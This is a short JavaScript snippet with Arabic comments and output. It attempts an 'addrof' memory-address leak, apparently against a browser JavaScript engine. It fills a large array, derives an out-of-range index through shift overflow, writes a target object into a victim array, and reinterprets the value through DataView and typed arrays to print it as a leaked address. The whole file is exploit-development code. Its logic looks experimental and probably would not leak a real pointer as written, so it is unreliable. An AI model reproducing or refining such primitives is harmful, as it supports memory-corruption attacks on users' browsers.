function addrof_with_dataview() {
    let output = "🔄 **تسريب العناوين باستخدام DataView**\n\n";
    
    let arr = [];
    for (let i = 0; i < 2000; i++) arr[i] = i + 0.1;
    for (let i = 0; i < (1 << 22); i++) arr[i] = i + 0.1;
    
    let target_obj = {
        unique: 0xDEADBEEF,
        data: "TARGET"
    };
    
    let victim = [1.1, 2.2, 3.3];
    let largeLength = Object.keys(arr).length;
    let index = (largeLength << 3) >> 31;
    
    // الطريقة: تخزين الكائن ثم محاولة قراءته كبايتات خام
    for (let i = 1; i >= index; i--) {
        victim[i] = target_obj;
    }
    
    output += "محاولات قراءة البيانات الخام:\n\n";
    
    // المحاولة 1: استخدام ArrayBuffer لنقل البيانات
    try {
        let ab = new ArrayBuffer(8);
        let dv = new DataView(ab);
        let f64 = new Float64Array(ab);
        
        f64[0] = victim[1]; // نسخ القيمة
        
        let as_bigint = dv.getBigUint64(0, true);
        output += `كـ BigInt: 0x${as_bigint.toString(16)}\n`;
        
        if (as_bigint !== 0x7ff8000000000000n) {
            output += "✅ عنوان غير قياسي!\n";
        }
    } catch(e) {
        output += `خطأ 1: ${e.message}\n`;
    }
    
    // المحاولة 2: استخدام Typed Arrays مختلفة
    try {
        let buffer = new ArrayBuffer(16);
        let f64_view = new Float64Array(buffer);
        let u32_view = new Uint32Array(buffer);
        
        f64_view[0] = victim[1];
        
        output += `كـ Uint32: [0x${u32_view[1].toString(16)}, 0x${u32_view[0].toString(16)}]\n`;
        output += `المجموع: 0x${((BigInt(u32_view[1]) << 32n) | BigInt(u32_view[0])).toString(16)}\n`;
    } catch(e) {
        output += `خطأ 2: ${e.message}\n`;
    }
    
    alert(output);
}

addrof_with_dataview();